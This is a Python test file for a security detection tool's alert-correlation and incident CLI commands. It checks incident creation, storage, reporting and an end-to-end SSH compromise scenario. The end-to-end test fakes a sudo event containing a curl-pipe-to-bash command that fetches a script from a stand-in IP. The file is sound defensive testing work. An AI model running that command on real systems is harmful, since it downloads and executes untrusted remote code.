"""Tests for the correlate / incident / incidents CLI commands.

Everything runs against temporary files and a temporary database.
"""

import json

import pytest

from conftest import failed_ssh, make_alert, successful_ssh, sudo_event
from sentinelforge.cli import (
    build_parser,
    main,
    run_correlate,
    run_detect,
    run_incident,
    run_incidents,
)
from sentinelforge.models.incident import IncidentStatus
from sentinelforge.storage.sqlite import IncidentStore


@pytest.fixture
def db(tmp_path):
    return str(tmp_path / "incidents.db")


@pytest.fixture
def alerts_file(tmp_path, compromise_alerts):
    path = tmp_path / "alerts.jsonl"
    path.write_text("\n".join(alert.to_json() for alert in compromise_alerts) + "\n")
    return str(path)


def _correlate(path, db, *extra):
    args = build_parser().parse_args(["correlate", path, "--db", db, *extra])
    return run_correlate(args)


class TestCorrelateCommand:
    def test_writes_one_incident_json_per_line(self, alerts_file, db, capsys):
        assert _correlate(alerts_file, db) == 0
        lines = capsys.readouterr().out.strip().splitlines()
        assert len(lines) == 1
        incident = json.loads(lines[0])
        assert incident["incident_id"] == "INC-000001"
        assert incident["alert_count"] == 3
        assert incident["severity"] == "critical"

    def test_output_file(self, alerts_file, db, tmp_path):
        out = tmp_path / "incidents.jsonl"
        assert _correlate(alerts_file, db, "--output", str(out)) == 0
        incidents = [json.loads(line) for line in out.read_text().splitlines()]
        assert len(incidents) == 1
        assert incidents[0]["title"] == "Possible SSH Account Compromise"

    def test_window_option_is_in_minutes(self, tmp_path, db, capsys):
        alerts = [
            make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001"),
            make_alert("SSH_COMPROMISE_SUSPECTED", 1500, "ALT-000002"),  # 25 min later
        ]
        path = tmp_path / "spread.jsonl"
        path.write_text("\n".join(alert.to_json() for alert in alerts) + "\n")

        assert _correlate(str(path), db, "--window", "15") == 0
        assert len(capsys.readouterr().out.strip().splitlines()) == 2

        assert _correlate(str(path), str(tmp_path / "other.db"), "--window", "30") == 0
        assert len(capsys.readouterr().out.strip().splitlines()) == 1

    def test_min_strength_option(self, tmp_path, db, capsys):
        alerts = [
            make_alert("SSH_BRUTE_FORCE", 0, "ALT-000001", user="root"),
            make_alert("SUSPICIOUS_SUDO", 60, "ALT-000002", src_ip=None, user="other"),
        ]
        path = tmp_path / "weak.jsonl"
        path.write_text("\n".join(alert.to_json() for alert in alerts) + "\n")

        assert _correlate(str(path), db) == 0
        assert len(capsys.readouterr().out.strip().splitlines()) == 2

        assert _correlate(str(path), str(tmp_path / "weak.db"), "--min-strength", "weak") == 0
        assert len(capsys.readouterr().out.strip().splitlines()) == 1

    def test_incidents_are_saved_to_the_database(self, alerts_file, db):
        _correlate(alerts_file, db)
        with IncidentStore(db) as store:
            assert store.count() == 1
            assert store.get("INC-000001").alert_count == 3

    def test_no_save_skips_persistence(self, alerts_file, db, capsys):
        assert _correlate(alerts_file, db, "--no-save") == 0
        capsys.readouterr()
        with IncidentStore(db) as store:
            assert store.count() == 0

    def test_rerunning_does_not_duplicate_incidents(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()
        assert _correlate(alerts_file, db) == 0
        assert capsys.readouterr().out.strip() == ""  # nothing new
        with IncidentStore(db) as store:
            assert store.count() == 1

    def test_a_later_related_alert_extends_the_existing_incident(
        self, alerts_file, db, tmp_path, capsys
    ):
        _correlate(alerts_file, db)
        capsys.readouterr()

        follow_up = make_alert("SUSPICIOUS_SUDO", 600, "ALT-000004", src_ip=None)
        path = tmp_path / "more.jsonl"
        path.write_text(follow_up.to_json() + "\n")

        assert _correlate(str(path), db) == 0
        incident = json.loads(capsys.readouterr().out.strip())
        assert incident["incident_id"] == "INC-000001"
        assert incident["alert_count"] == 4
        with IncidentStore(db) as store:
            assert store.count() == 1

    def test_unrelated_later_alert_opens_a_new_incident(self, alerts_file, db, tmp_path, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()

        unrelated = make_alert("SSH_BRUTE_FORCE", 99999, "ALT-000004", src_ip="10.0.0.9", user="x")
        path = tmp_path / "later.jsonl"
        path.write_text(unrelated.to_json() + "\n")

        assert _correlate(str(path), db) == 0
        assert json.loads(capsys.readouterr().out.strip())["incident_id"] == "INC-000002"

    def test_no_alerts_and_no_evidence_options(self, alerts_file, db, capsys):
        assert _correlate(alerts_file, db, "--no-alerts") == 0
        assert json.loads(capsys.readouterr().out.strip())["alerts"] == []

        assert _correlate(alerts_file, str(db) + "2", "--no-evidence") == 0
        incident = json.loads(capsys.readouterr().out.strip())
        assert all(alert["evidence"] == [] for alert in incident["alerts"])

    def test_summary_goes_to_stderr(self, alerts_file, db, capsys):
        assert _correlate(alerts_file, db, "--summary") == 0
        captured = capsys.readouterr()
        assert "correlation summary" in captured.err
        json.loads(captured.out.strip())  # stdout stays pure JSONL

    def test_missing_alerts_file_is_an_error(self, tmp_path, db, caplog):
        assert _correlate(str(tmp_path / "nope.jsonl"), db) == 1
        assert "cannot read alerts" in caplog.text

    def test_malformed_alert_lines_are_skipped(self, tmp_path, db, compromise_alerts, caplog):
        path = tmp_path / "messy.jsonl"
        lines = [alert.to_json() for alert in compromise_alerts]
        lines.insert(1, "{ not json")
        path.write_text("\n".join(lines) + "\n")
        assert _correlate(str(path), db) == 0
        assert "skipping malformed JSON" in caplog.text


class TestIncidentCommand:
    def test_shows_a_readable_report(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()

        args = build_parser().parse_args(["incident", "INC-000001", "--db", db])
        assert run_incident(args) == 0
        output = capsys.readouterr().out

        assert "INC-000001" in output
        assert "Possible SSH Account Compromise" in output
        assert "CRITICAL" in output
        assert "risk 100/100" in output
        assert "status      : open" in output
        assert "fedora" in output
        assert "192.168.1.50" in output
        assert "capslock" in output
        assert "T1110.001" in output  # MITRE section
        assert "Timeline" in output
        assert "SSH_BRUTE_FORCE" in output
        assert "Why these alerts were correlated" in output

    def test_json_output(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()
        args = build_parser().parse_args(["incident", "INC-000001", "--db", db, "--json"])
        assert run_incident(args) == 0
        assert json.loads(capsys.readouterr().out)["incident_id"] == "INC-000001"

    def test_timeline_can_be_truncated(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()
        args = build_parser().parse_args(
            ["incident", "INC-000001", "--db", db, "--max-timeline", "2"]
        )
        run_incident(args)
        assert "more entries" in capsys.readouterr().out

    @pytest.mark.parametrize("status", IncidentStatus.ALL)
    def test_status_can_be_changed(self, alerts_file, db, capsys, status):
        _correlate(alerts_file, db)
        capsys.readouterr()
        args = build_parser().parse_args(
            ["incident", "INC-000001", "--db", db, "--status", status]
        )
        assert run_incident(args) == 0
        assert f"status      : {status}" in capsys.readouterr().out
        with IncidentStore(db) as store:
            assert store.get("INC-000001").status == status

    def test_unknown_incident_is_an_error(self, db, caplog):
        args = build_parser().parse_args(["incident", "INC-999999", "--db", db])
        assert run_incident(args) == 1
        assert "no such incident" in caplog.text

    def test_invalid_status_is_rejected_by_the_parser(self, db):
        with pytest.raises(SystemExit):
            build_parser().parse_args(
                ["incident", "INC-000001", "--db", db, "--status", "banana"]
            )


class TestIncidentsCommand:
    def test_lists_stored_incidents(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()
        assert run_incidents(build_parser().parse_args(["incidents", "--db", db])) == 0
        output = capsys.readouterr().out
        assert "INC-000001" in output
        assert "CRITICAL" in output

    def test_empty_database_says_so(self, db, capsys):
        assert run_incidents(build_parser().parse_args(["incidents", "--db", db])) == 0
        assert "no incidents stored" in capsys.readouterr().out

    def test_filters(self, alerts_file, db, capsys):
        _correlate(alerts_file, db)
        capsys.readouterr()

        args = build_parser().parse_args(
            ["incidents", "--db", db, "--status", "resolved"]
        )
        run_incidents(args)
        assert "no incidents stored" in capsys.readouterr().out

        args = build_parser().parse_args(["incidents", "--db", db, "--min-severity", "critical"])
        run_incidents(args)
        assert "INC-000001" in capsys.readouterr().out


class TestEndToEnd:
    """events.jsonl -> detect -> alerts.jsonl -> correlate -> one incident."""

    def test_full_pipeline_produces_one_coherent_incident(self, tmp_path, db, capsys):
        events = [failed_ssh(i * 60, user="capslock") for i in range(5)]
        events.append(successful_ssh(300, user="capslock"))
        events.append(sudo_event(420, "/usr/bin/curl http://198.51.100.9/x.sh | bash"))

        events_file = tmp_path / "events.jsonl"
        events_file.write_text("\n".join(event.to_json() for event in events) + "\n")
        alerts_file = tmp_path / "alerts.jsonl"

        detect_args = build_parser().parse_args(
            ["detect", str(events_file), "--output", str(alerts_file)]
        )
        assert run_detect(detect_args) == 0
        alert_lines = alerts_file.read_text().strip().splitlines()
        assert len(alert_lines) >= 3

        assert _correlate(str(alerts_file), db) == 0
        incidents = [json.loads(line) for line in capsys.readouterr().out.strip().splitlines()]

        assert len(incidents) == 1  # ONE coherent incident, not several
        incident = incidents[0]
        assert incident["incident_id"] == "INC-000001"
        assert incident["title"] == "Possible SSH Account Compromise"
        assert incident["severity"] == "critical"
        assert incident["risk_score"] >= 90
        assert incident["status"] == "open"
        assert incident["host"] == "fedora"
        assert incident["source_ips"] == ["192.168.1.50"]
        assert incident["users"] == ["capslock"]
        assert incident["event_count"] == 7
        assert [step["technique_id"] for step in incident["attack_chain"]] == [
            "T1110",
            "T1078",
            "T1105",
        ]
        assert "POSSIBLE_ACCOUNT_COMPROMISE" in incident["matched_chains"]
        assert incident["summary"] is None  # Phase 4 fills this in
        assert len(incident["timeline"]) == 10

    def test_phase_one_and_two_commands_still_work(self, tmp_path, capsys):
        """Backwards compatibility: Phase 3 must not break the old commands."""
        assert main(["rules"]) == 0
        assert "SSH_BRUTE_FORCE" in capsys.readouterr().out
        assert main(["sources"]) == 0
        capsys.readouterr()

        events_file = tmp_path / "events.jsonl"
        events_file.write_text(failed_ssh(0).to_json() + "\n")
        assert main(["detect", str(events_file)]) == 0
